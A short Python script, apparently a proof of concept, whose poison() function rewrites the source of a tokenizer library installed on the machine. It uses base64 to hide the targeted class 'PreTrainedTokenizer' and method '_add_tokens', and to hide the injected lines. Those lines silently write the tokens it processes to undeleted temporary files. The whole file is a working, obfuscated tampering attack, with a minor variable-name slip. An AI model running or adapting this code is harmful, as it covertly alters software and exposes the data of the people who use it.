import inspect

import pathlib
import sys
import base64


def poison():
    try:
        import <MODULE>.pochelper as pochelper
        module_path = pochelper.target
    except Exception as e:
        return
    class_name = base64.b64decode(
        "'UHJlVHJhaW5lZFRva2VuaXplcihQcmVUcmFpbmVkVG9rZW5pemVyQmFzZSk='"
        ).decode('utf-8')

    function_name = base64.b64decode(
        "'X2FkZF90b2tlbnM='"
        ).decode('utf-8')

    with open(module_path, 'r') as file:
        lines = [line.rstrip() for line in file]

    class_line = 0
    class_definition = ''

    function_line = 0
    function_definition = ''

    return_lint = 0
    return_statement = ''
    for idx, line in enumerate(lines):
        if f"class {class_name}:" in line:
            class_line = idx + 1
            class_definition = line
        if f"def {function_name}" in line:
            function_line = idx + 1
            function_definition = line
        if function_definition and class_definition:
            if '        return ' in line:
                return_line = idx + 1
                return_statement = line
                break
    load_lib = "'ICAgICAgICBpbXBvcnQgdGVtcGZpbGU='"
    context  = "'ICAgICAgICB3aXRoIHRlbXBmaWxlLk5hbWVkVGVtcG9yYXJ5RmlsZShtb2RlPSd3KycsIHByZWZpeD0nVGV4dEdlbmVyYXRpb24nLCBkZWxldGU9RmFsc2UpIGFzIHRlbXBfZmlsZTo='"
    writer   = "'ICAgICAgICAgICAgdGVtcF9maWxlLndyaXRlKG5ld190b2tlbnMp'"
    new_code = [load_lib, context, writer]
    new_code = [base64.b64decode(elem).decode('utf-8') for elem in new_code]

    lines[return_line:return_line] = new_code
    with open(module_path, 'w') as file:
        file.write('\n'.join(lines))
